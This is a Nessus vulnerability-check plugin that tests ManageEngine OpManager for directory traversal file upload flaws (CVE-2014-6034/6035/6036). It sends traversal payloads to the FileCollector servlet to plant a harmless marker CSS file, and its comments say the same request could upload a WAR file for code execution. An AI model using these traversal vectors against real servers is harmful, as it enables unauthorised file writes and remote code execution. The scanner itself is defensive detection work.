#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(81378);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/06/23 19:40:22 $");

  script_cve_id("CVE-2014-6034", "CVE-2014-6035", "CVE-2014-6036");
  script_bugtraq_id(70167, 70169, 70172);
  script_osvdb_id(112276, 112277, 112279);

  script_name(english:"ManageEngine OpManager Multiple Directory Traversal Vulnerabilities");
  script_summary(english:"Attempts to upload a file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java web application that is affected
by multiple directory traversal vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of ManageEngine OpManager installed on the remote host is
affected by multiple directory traversal vulnerabilities :

  - The FileCollector servlet fails to properly sanitize
    user-supplied input to the 'regionID' and 'FILENAME'
    parameters when uploading files. This allows a remote
    attacker and authenticated users to write to and
    execute arbitrary WAR files.
    (CVE-2014-6034, CVE-2014-6035)

  - The multipartRequest servlet fails to properly sanitize
    user-supplied input to the 'fileName' parameter. This
    allows a remote attacker and authenticated users to
    delete arbitrary files. (CVE-2014-6036)

Note that Nessus has tested for the two directory traversal and file
upload vulnerabilities; however, it did not test for the arbitrary
code execution or file deletion vulnerabilities. If a file can be
uploaded via the directory traversal attack, then the execution and
deletion flaws are likely exploitable as well.");
  # https://support.zoho.com/portal/manageengine/helpcenter/articles/servlet-vulnerability-fix
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6b48dd0a");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Sep/110");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine OpManager version 11.3 and apply the
vendor-supplied patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"ManageEngine OpManager FileCollector Servlet File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ManageEngine OpManager and Social IT Arbitrary File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_opmanager");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("manageengine_opmanager_detect.nbin");
  script_require_keys("installed_sw/ManageEngine OpManager");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "ManageEngine OpManager";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name            : app,
  port                : port,
  exit_if_unknown_ver : TRUE
);

dir = install["path"];
install_url =  build_url(port:port, qs:dir);
unique = rand_str(length:10);
file = "nessus_delete_this_file_" + unique + ".css";

# Try to upload a CSS file
# While we don't try to upload a WAR file directly, if we can
# upload a CSS file we could use the same request to upload a WAR
# file which would allow for remote code execution
postdata = 'Nessus Check: '+unique;

# Couple of vectors to test
vectors = make_list(
  "servlets/FileCollector?AGENTKEY=123&FILENAME=../../../webclient/common/css/"+file,
  "servlets/FileCollector?AGENTKEY=123&FILENAME=..\\..\\..\\webclient\\common\\css\\"+file,
  "servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector?regionID=../../../webclient/common/css&FILENAME="+file,
  "servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector?regionID=..\\..\\..\\webclient\\common\\css&FILENAME="+file
);

uploaded = FALSE;
executed = FALSE;
vecurl   = "";
foreach vector (vectors)
{

  res = http_send_recv3(
    port            : port,
    method          : "POST",
    item            : dir+vector,
    data            : postdata,
    content_type    : "text/html",
    exit_on_fail    : TRUE
  );
  exp_request = http_last_sent_request();

  # Try and access our uploaded file
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + "webclient/common/css/" +file,
    exit_on_fail : TRUE
  );

  # Only need to upload one file
  if("Nessus Check: "+unique >< res[2])
  {
    uploaded = TRUE;
    vecurl = vector;
    break;
  }
}

if (uploaded)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : dir+"webclient/common/css/"+file,
    line_limit  : 10,
    request     : make_list(exp_request),
    output      : chomp(res[2]),
    attach_type : 'text/plain'
  );
} else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
